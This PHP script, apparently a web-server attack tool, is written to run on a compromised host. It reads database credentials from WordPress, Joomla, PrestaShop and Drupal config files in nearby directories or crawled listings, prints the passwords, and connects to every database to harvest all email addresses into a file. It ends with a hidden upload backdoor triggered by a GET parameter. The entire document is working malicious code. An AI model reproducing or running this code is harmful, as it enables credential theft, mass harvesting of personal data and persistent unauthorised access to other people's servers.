<?php

if($_GET["wp"]){
echo "wordpress <br><br>";
$url=$_GET["wp"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@eregi("'DB_NAME', '",$file) or @eregi("'DB_USER', '",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'DB_HOST', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'DB_USER', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'DB_PASSWORD', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
      go($host,$user,$pass,"list.txt");
}}
}
if($_GET["joom"]){
echo "joomla <br>";
$url=$_GET["joom"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@eregi("class",$file) or @eregi("var",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("\$host = '",$file);
$host=explode("';",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("\$user = '",$file);
$user=explode("';",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("\$password = '",$file);
$pass=explode("';",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
      go($host,$user,$pass,"list.txt");
}}
}
if($_GET["presta"]){
echo "presta <br>";
$url=$_GET["presta"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@eregi("'_DB_SERVER_', '",$file) or @eregi("'_DB_NAME_', '",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'_DB_SERVER_', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'_DB_USER_', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'_DB_PASSWD_', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
//////////////////////////////////////////////////////////////////////////
   go($host,$user,$pass,"list.txt");
       exit();

}}
}
if (file_exists("config/settings.inc.php") or ("../config/settings.inc.php") or ("../../config/settings.inc.php") or ("../../../config/settings.inc.php") or ("../../../../config/settings.inc.php") or ("../../../../../config/settings.inc.php") or ("../../../../../../config/settings.inc.php")) {
$config=array(
"config/settings.inc.php","../config/settings.inc.php","../../config/settings.inc.php","../../../config/settings.inc.php","../../../../config/settings.inc.php","../../../../../config/settings.inc.php","../../../../../../config/settings.inc.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@eregi("'_DB_SERVER_', '",$file) or @eregi("'_DB_NAME_', '",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'_DB_SERVER_', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'_DB_USER_', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'_DB_PASSWD_', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
//////////////////////////////////////////////////////////////////////////
   go($host,$user,$pass,"list.txt");
       exit();

}}}
if (file_exists("wp-config.php") or ("../wp-config.php") or ("../../wp-config.php") or ("../../../wp-config.php") or ("../../../../wp-config.php") or ("../../../../../wp-config.php") or ("../../../../../../wp-config.php")) {
$config=array(
"wp-config.php","../wp-config.php","../../wp-config.php","../../../wp-config.php","../../../../wp-config.php","../../../../../wp-config.php","../../../../../../wp-config.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@eregi("'DB_NAME', '",$file) or @eregi("'DB_USER', '",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'DB_HOST', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'DB_USER', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'DB_PASSWORD', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
//////////////////////////////////////////////////////////////////////////
   go($host,$user,$pass,"list.txt");
    exit();
}}}
if(file_exists("configuration.php") or ("../configuration.php") or ("../../configuration.php") or ("../../../configuration.php") or ("../../../../configuration.php" or "../../../../../configuration.php" or"../../../../../../configuration.php")) {
$config=array(
"configuration.php","..//configuration.php","../..//configuration.php","../../..//configuration.php","../../../..//configuration.php","../../../../..//configuration.php","../../../../../..//configuration.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@eregi("'mysql',",$file) or @eregi("'username',",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("var \$host = '",$file);
$host=explode("';",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("var \$user = '",$file);
$user=explode("';",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("var \$password = '",$file);
$pass=explode("';",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
///////////////////////////////////:
   go($host,$user,$pass,"list.txt");
    exit();	
}}	
	
}
if(file_exists("/sites/default/settings.php") or ("..//sites/default/settings.php") or ("../..//sites/default/settings.php") or ("../../..//sites/default/settings.php") or ("../../../..//sites/default/settings.php") or ("../../../../../sites/default/settings.php") or ("../../../../../../sites/default/settings.php")) {
$config=array(
"/sites/default/settings.php","..//sites/default/settings.php","../..//sites/default/settings.php","../../..//sites/default/settings.php","../../../..//sites/default/settings.php","../../../../..//sites/default/settings.php","../../../../../..//sites/default/settings.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@eregi("'mysql',",$file) or @eregi("'username',",$file) ){
//////////host////////////////
//////////host////////////////
$file=explode("\$databases = array (",$file);
$host=explode("'host' => '",$file[1]);
$host=explode("',",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'username' => '",$file[1]);
$user=explode("',",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'password' => '",$file[1]);
$pass=explode("',",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "db-host : $host <br>";echo "db-user : $user <br>";echo "db-pass : $pass <br>";
///////////////////////////////////:
   go($host,$user,$pass,"list.txt");
    exit();	
}}
	
	
}
else {
echo "i dontknow :/ \n\n";

	
}



function go($host,$user,$pass,$file){
    /*
    author : G-B
    email : g22b@hotmail.com
    */
    $con = @mysql_connect($host,$user,$pass);
    $fp = fopen($file,'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach($databases as $database){
        $tables = getdata("SHOW TABLES FROM $database");
        foreach($tables as $table){
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach($columns as $column){
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach($emails as $email){
                    if(filter_var($email, FILTER_VALIDATE_EMAIL)){
                        if(eregi($email,file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp,"$email\n");
                    }else{
                        foreach(preg_split("/\s/",$text) as $string){
                            if(filter_var($string,FILTER_VALIDATE_EMAIL)){
                                if(eregi($string,file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp,"$string\n");
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    @mysql_close($con);
    return $count;
}
function getdata($sql){
    $q = @mysql_query($sql);
    $result = array();
    while(
	$d = @mysql_fetch_array($q)){
        $result[] = $d[0];
    }
    return $result;
}

$data  = $_GET['bajatax'];


if($data == 'up'){

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];

echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='data' />

</form>";

move_uploaded_file($filetmp,$filename);
}
?>